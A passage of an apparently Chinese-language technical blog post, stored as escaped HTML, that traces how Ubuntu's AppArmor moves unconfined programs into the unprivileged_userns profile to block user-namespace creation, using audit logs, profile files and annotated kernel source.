profile ipa_verify /usr/bin/ipa_verify flags=(unconfined) {
  userns,

  # Site-specific additions and overrides. See local/README for details.
  include if exists &amp;lt;local/ipa_verify&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;profile ipa_verify&lt;/code&gt;：定義了一個名為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipa_verify&lt;/code&gt; 的設定檔。&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/ipa_verify&lt;/code&gt;：這個設定檔套用在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/ipa_verify&lt;/code&gt; 這個執行檔上，當該執行檔被執行時，設定檔會自動載入。&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flags=(unconfined)&lt;/code&gt;：表示這個設定檔處於 unconfined 狀態，也就是雖然載入了設定檔，但實際上不會限制該程式的行為。&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userns&lt;/code&gt;：允許該程式操作使用者命名空間。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用者可以透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa-status&lt;/code&gt; 命令列出目前系統中已啟用的 AppArmor 設定檔及其狀態。以下是一個 JSON 格式的輸出範例：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
    &quot;version&quot;: &quot;2&quot;,
    &quot;profiles&quot;: {
        &quot;/snap/snapd/23258/usr/lib/snapd/snap-confine&quot;: &quot;enforce&quot;,
        &quot;/usr/sbin/sssd&quot;: &quot;complain&quot;,
        &quot;Discord&quot;: &quot;unconfined&quot;
    },
    &quot;processes&quot;: {
        &quot;/usr/sbin/rsyslogd&quot;: [
            {
                &quot;profile&quot;: &quot;rsyslogd&quot;,
                &quot;pid&quot;: &quot;1176&quot;,
                &quot;status&quot;: &quot;enforce&quot;
            }
        ]
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;22-behavior-in-ubuntu&quot;&gt;2.2. Behavior in Ubuntu&lt;/h3&gt;

&lt;p&gt;使用者可以透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshare&lt;/code&gt; 命令，在非特權使用者命名空間下執行任意命令。不過，自從 Ubuntu 引入新的安全機制後，執行這個命令會出現 &lt;strong&gt;“Operation not permitted”（-EPERM）&lt;/strong&gt; 錯誤，表示操作被拒絕。&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unshare &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; /bin/bash
unshare: write failed /proc/self/uid_map: Operation not permitted
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此時如果使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmesg&lt;/code&gt; 命令查看核心日誌，會看到與 AppArmor 事件有關的日誌。&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;dmesg
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302291.394909] audit: &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1400 audit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1739761091.573:545&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;nv&quot;&gt;apparmor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AUDIT&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;operation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;userns_create&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;namespace&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Userns create - transitioning profile&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unconfined&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;29466 &lt;span class=&quot;nb&quot;&gt;comm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unshare&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;requested&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;userns_create&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unprivileged_userns&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302291.395747] audit: &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1400 audit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1739761091.574:546&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;nv&quot;&gt;apparmor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DENIED&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;operation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;capable&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cap&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unprivileged_userns&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;29466 &lt;span class=&quot;nb&quot;&gt;comm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unshare&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;capability&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;21  &lt;span class=&quot;nv&quot;&gt;capname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sys_admin&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ol&gt;
  &lt;li&gt;第一個 AppArmor 事件：稽核事件（Audit Event）
    &lt;ul&gt;
      &lt;li&gt;這筆事件紀錄了執行相關的細節。&lt;/li&gt;
      &lt;li&gt;內容指出，PID 為 29466 的程式（&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshare&lt;/code&gt;）試圖建立一個使用者命名空間（&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;operation=&quot;userns_create&quot;&lt;/code&gt;）。&lt;/li&gt;
      &lt;li&gt;該程式當下是以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; 設定檔執行，代表尚未受到任何限制。&lt;/li&gt;
      &lt;li&gt;在這筆事件之後，AppArmor 將該程式指派到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; 這設定檔。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;第二個 AppArmor 事件：拒絕事件（Deny Event）
    &lt;ul&gt;
      &lt;li&gt;這筆事件表示有一個操作被 AppArmor 阻擋。&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; 設定檔限制程式使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_admin&lt;/code&gt; capability。&lt;/li&gt;
      &lt;li&gt;而 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshare&lt;/code&gt; 建立使用者命名空間時需要用到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_admin&lt;/code&gt;，因此被 AppArmor 阻擋，最終導致 &lt;strong&gt;“Operation not permitted (-EPERM)”&lt;/strong&gt; 錯誤。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;在 Ubuntu 中，所有的 AppArmor 設定檔都放在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apparmor.d/&lt;/code&gt; 目錄底下：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /etc/apparmor.d/
total 528
drwxr-xr-x   9 root root  4096 Feb 17 10:46 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 141 root root 12288 Feb 16 20:46 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root   354 Oct  2 07:24 1password
...
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root   699 Oct  2 07:24 unprivileged_userns
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;檔案 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apparmor.d/unprivileged_userns&lt;/code&gt; 定義了 AppArmor 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; 設定檔。以下是該檔案部分內容的說明：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]

profile unprivileged_userns {
     audit deny capability,
     audit deny change_profile,

     [...]
     allow mqueue,
     allow ptrace,
     allow userns,
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我們在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmesg&lt;/code&gt; 命令中看到的第二筆事件，正是由 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audit deny capability&lt;/code&gt; 規則所產生。這條規則會阻擋所有需要特定 capabilities（例如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_NET_ADMIN&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_CHOWN&lt;/code&gt;）的操作，並記錄任何被拒絕的請求。&lt;/p&gt;

&lt;p&gt;既然我們已經確認在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; 設定檔下，建立非特權使用者命名空間是被禁止的，那接下來最關鍵的問題就是：
&lt;strong&gt;為什麼原本處於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; 設定檔的程式，會自動被轉換到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt;？&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;為了解答這個問題，我們需要深入了解 Ubuntu 是如何使用 AppArmor 來實作沙盒！&lt;/p&gt;

&lt;h2 id=&quot;3-investigating-ubuntu-kernel-patch&quot;&gt;3. Investigating Ubuntu Kernel Patch&lt;/h2&gt;

&lt;h3 id=&quot;31-analysis-strategy&quot;&gt;3.1. Analysis Strategy&lt;/h3&gt;

&lt;p&gt;每個 Linux 發行版都會根據自身需求修改 Linux 核心，Ubuntu 當然也不例外。&lt;/p&gt;

&lt;p&gt;在分析 Ubuntu 的原始碼時，一共會下載兩個檔案：一是 Linux 原始碼的基礎版本（例如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux_&amp;lt;ver&amp;gt;.orig.tar.gz&lt;/code&gt;），另一個則是 Ubuntu 自行維護的修改差異檔（例如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux_&amp;lt;ver&amp;gt;-&amp;lt;x&amp;gt;.&amp;lt;y&amp;gt;.diff.gz&lt;/code&gt;，其中 x 是 Ubuntu 的內部維護版本號，y 則通常是次要版本或修補版本）。若要分析 Ubuntu 的客製化行為，通常會搭配這個差異檔來檢查套用後的核心原始碼。&lt;/p&gt;

&lt;p&gt;但就拿 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux_6.11.0-18.18.diff&lt;/code&gt; 這個檔案來說，與基礎版本的差異超過 26 萬行。我們要從何下手？&lt;/p&gt;

&lt;p&gt;透過一些經驗法則能大幅縮小要分析的範圍：像這次 AppArmor 的異常行為，只有在建立非特權使用者命名空間時觸發，因此只要分析與該操作有關的程式碼就好；此外，也可以從事件中出現的關鍵字下手，像是搜尋特定字串，就能快速定位到實際負責執行該邏輯的核心程式碼。&lt;/p&gt;

&lt;h3 id=&quot;32-diving-into-the-source&quot;&gt;3.2. Diving Into the Source&lt;/h3&gt;

&lt;p&gt;當使用者建立命名空間時，AppArmor 會觸發 hook 函數 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_userns_create()&lt;/code&gt; [1]，這個函數是 AppArmor 為建立命名空間所設計的安全檢查點。接著，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_userns_create()&lt;/code&gt; 會呼叫另一個函數 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; [2]，負責處理與命名空間權限相關的設定與判斷。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_hook_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_hooks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__ro_after_init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LSM_HOOK_INIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;userns_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_userns_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [1]&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apparmor_userns_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_cred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;begin_current_label_crit_section&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aa_unprivileged_userns_restricted&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* default value: 1 */&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;label_mediates&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CLASS_NS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn_label_build&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;aa_profile_ns_perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [2]&lt;/span&gt;
                           &lt;span class=&quot;n&quot;&gt;AA_USERNS_CREATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;end_current_label_crit_section&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;當 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; 偵測到目前程式使用的設定檔處於 unconfined 狀態 [3] 且為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; 設定檔 [4] 時，它會直接指派程式成一個寫死的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; 設定檔 [5]。這個設定檔對應的就是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apparmor.d/unprivileged_userns&lt;/code&gt;，而也正是套用了設定檔，AppArmore 才阻止程式建立非特權使用者命名空間。&lt;/p&gt;

&lt;p&gt;下方是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; 函數的部分程式碼片段。完整的實作中包含了大量標註了 &lt;strong&gt;“TODO”&lt;/strong&gt; 和 &lt;strong&gt;“hardcode”&lt;/strong&gt; 的註解，顯示這整套機制目前仍在開發階段，許多行為其實還沒有正式定型。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;aa_profile_ns_perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_audit_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_ruleset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list_first_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                            &lt;span class=&quot;n&quot;&gt;typeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_perms&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;aa_state_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RULE_MEDIATES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile_unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [3]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profiles_ns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [4]&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
